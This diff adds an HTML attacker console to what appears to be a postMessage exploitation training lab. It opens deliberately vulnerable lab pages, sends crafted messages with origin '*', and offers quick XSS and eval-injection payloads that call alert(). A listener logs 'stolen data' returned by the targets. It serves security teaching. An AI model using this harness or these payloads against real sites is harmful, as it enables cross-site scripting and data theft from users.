@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Attacker Page - PostMessage Exploitation</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body style="background:#1a0a0a;min-height:100vh">
+
+  <div class="lab-toolbar" style="background:#2a0a0a;border-color:#4a1a1a">
+    <span style="color:var(--danger);font-weight:bold">&#9760; ATTACKER PAGE</span>
+    <span style="color:var(--text-muted);font-size:13px">Use this to send postMessages to lab pages</span>
+  </div>
+
+  <div style="max-width:800px;margin:24px auto;padding:0 24px">
+    <div style="background:rgba(239,68,68,0.1);border:1px solid var(--danger);border-radius:12px;padding:24px;margin-bottom:24px">
+      <h2 style="color:var(--danger);margin-bottom:8px">&#9760; PostMessage Attack Console</h2>
+      <p style="color:var(--text-secondary);font-size:14px">This page simulates an attacker's website. Use it to send malicious postMessages to vulnerable lab pages.</p>
+    </div>
+
+    <!-- Target Selection -->
+    <div class="lab-form" style="background:#1e0a0a;border-color:#4a1a1a">
+      <h3 style="color:var(--danger);margin-bottom:12px">Step 1: Open Target</h3>
+      <label>Target Lab URL</label>
+      <select id="targetSelect" style="background:#0a0505;border-color:#4a1a1a">
+        <option value="/labs/postmessage/level1.html">PostMessage #1: No Origin Check</option>
+        <option value="/labs/postmessage/level2.html">PostMessage #2: indexOf Bypass</option>
+        <option value="/labs/postmessage/level3.html">PostMessage #3: eval() Handler</option>
+        <option value="/labs/postmessage/level4.html">PostMessage #4: iframe Sandbox</option>
+      </select>
+      <button class="btn btn-danger" onclick="openTarget()">Open Target in New Window</button>
+      <div id="target-status" style="margin-top:8px;font-size:13px"></div>
+    </div>
+
+    <!-- Message Crafting -->
+    <div class="lab-form" style="background:#1e0a0a;border-color:#4a1a1a;margin-top:16px">
+      <h3 style="color:var(--danger);margin-bottom:12px">Step 2: Craft & Send Message</h3>
+
+      <label>Quick Payloads (click to load)</label>
+      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px">
+        <button class="btn btn-secondary" style="font-size:11px" onclick="loadPayload('lab1-xss')">Lab1: innerHTML XSS</button>
+        <button class="btn btn-secondary" style="font-size:11px" onclick="loadPayload('lab2-eval')">Lab2: eval bypass</button>
+        <button class="btn btn-secondary" style="font-size:11px" onclick="loadPayload('lab3-cmd')">Lab3: cmd injection</button>
+        <button class="btn btn-secondary" style="font-size:11px" onclick="loadPayload('lab2-html')">Lab2: innerHTML</button>
+        <button class="btn btn-secondary" style="font-size:11px" onclick="loadPayload('custom')">Custom</button>
+      </div>
+
+      <label>Message Data (JSON)</label>
+      <textarea id="messageData" rows="6" style="background:#0a0505;border-color:#4a1a1a;font-family:monospace;font-size:13px">{"type":"update","content":"<img src=x onerror=alert('XSS')>"}</textarea>
+
+      <label>Target Origin (use * for any)</label>
+      <input type="text" id="targetOrigin" value="*" style="background:#0a0505;border-color:#4a1a1a">
+
+      <div style="display:flex;gap:8px">
+        <button class="btn btn-danger" onclick="sendMessage()">Send postMessage</button>
+        <button class="btn btn-secondary" onclick="sendRaw()">Send as raw string</button>
+      </div>
+    </div>
+
+    <!-- Attack Log -->
+    <div style="margin-top:16px">
+      <div class="attacker-console" style="border-color:#8b0000">
+        <div class="title" style="color:#ff4444">Attack Log</div>
+        <div id="attack-log">
+          <div class="log" style="color:var(--text-muted)">Ready to attack. Open a target window first.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Listener for stolen data -->
+    <div style="margin-top:16px">
+      <div class="attacker-console" style="border-color:#8b6900">
+        <div class="title" style="color:var(--warning)">Stolen Data Listener</div>
+        <div id="stolen-data">
+          <div class="log" style="color:var(--text-muted)">Listening for data from target windows...</div>
+        </div>
+      </div>
+    </div>
+
+    <div style="margin-top:20px;padding:16px;background:#1e0a0a;border:1px solid #4a1a1a;border-radius:8px">
+      <p style="font-size:13px;color:var(--text-muted)">
+        <strong>How this works:</strong> This page uses <code>window.open()</code> to get a reference to the target lab page. It then sends postMessages to that window reference. In a real attack, the attacker would host this page on their domain and trick the victim into visiting it while they have the vulnerable page open.
+      </p>
+    </div>
+  </div>
+
+  <script>
+    var targetWindow = null;
+    var attackLog = document.getElementById('attack-log');
+
+    var PAYLOADS = {
+      'lab1-xss': '{"type":"update","content":"<img src=x onerror=alert(\'XSS\')>"}',
+      'lab2-eval': '{"action":"render","callback":"alert(\'XSS\')"}',
+      'lab2-html': '{"action":"html","content":"<img src=x onerror=alert(\'XSS\')>"}',
+      'lab3-cmd': '{"cmd":"console.log(1);alert(\'XSS\')"}',
+      'custom': '{"type":"update","content":"Hello from attacker!"}'
+    };
+
+    function loadPayload(name) {
+      document.getElementById('messageData').value = PAYLOADS[name] || '{}';
+    }
+
+    function openTarget() {
+      var url = document.getElementById('targetSelect').value;
+      var fullUrl = window.location.origin + url;
+      targetWindow = window.open(fullUrl, 'targetWindow');
+      document.getElementById('target-status').innerHTML =
+        '<span style="color:var(--success)">Target window opened: ' + fullUrl + '</span>';
+      attackLog.innerHTML += '<div class="log">Opened target: ' + fullUrl + '</div>';
+    }
+
+    function sendMessage() {
+      if (!targetWindow || targetWindow.closed) {
+        attackLog.innerHTML += '<div class="log" style="color:var(--danger)">No target window! Open one first.</div>';
+        return;
+      }
+
+      var data = document.getElementById('messageData').value;
+      var origin = document.getElementById('targetOrigin').value;
+
+      try {
+        targetWindow.postMessage(data, origin);
+        attackLog.innerHTML += '<div class="log" style="color:var(--success)">Sent postMessage (JSON string): ' + data.substring(0, 100) + '</div>';
+        attackLog.innerHTML += '<div class="log">Target origin: ' + origin + '</div>';
+      } catch(e) {
+        attackLog.innerHTML += '<div class="log" style="color:var(--danger)">Error: ' + e.message + '</div>';
+      }
+    }
+
+    function sendRaw() {
+      if (!targetWindow || targetWindow.closed) {
+        attackLog.innerHTML += '<div class="log" style="color:var(--danger)">No target window! Open one first.</div>';
+        return;
+      }
+
+      var data = document.getElementById('messageData').value;
+      var origin = document.getElementById('targetOrigin').value;
+
+      try {
+        // Send as parsed object instead of string
+        var parsed = JSON.parse(data);
+        targetWindow.postMessage(parsed, origin);
+        attackLog.innerHTML += '<div class="log" style="color:var(--success)">Sent postMessage (object): ' + JSON.stringify(parsed).substring(0, 100) + '</div>';
+      } catch(e) {
+        targetWindow.postMessage(data, origin);
+        attackLog.innerHTML += '<div class="log" style="color:var(--success)">Sent raw string: ' + data.substring(0, 100) + '</div>';
+      }
+    }
+
+    // Listen for responses/stolen data
+    window.addEventListener('message', function(e) {
+      var stolenData = document.getElementById('stolen-data');
+      stolenData.innerHTML += '<div class="log" style="color:var(--warning)">Received from ' + e.origin + ': ' + JSON.stringify(e.data).substring(0, 200) + '</div>';
+    });
+  </script>
+</body>
+</html>
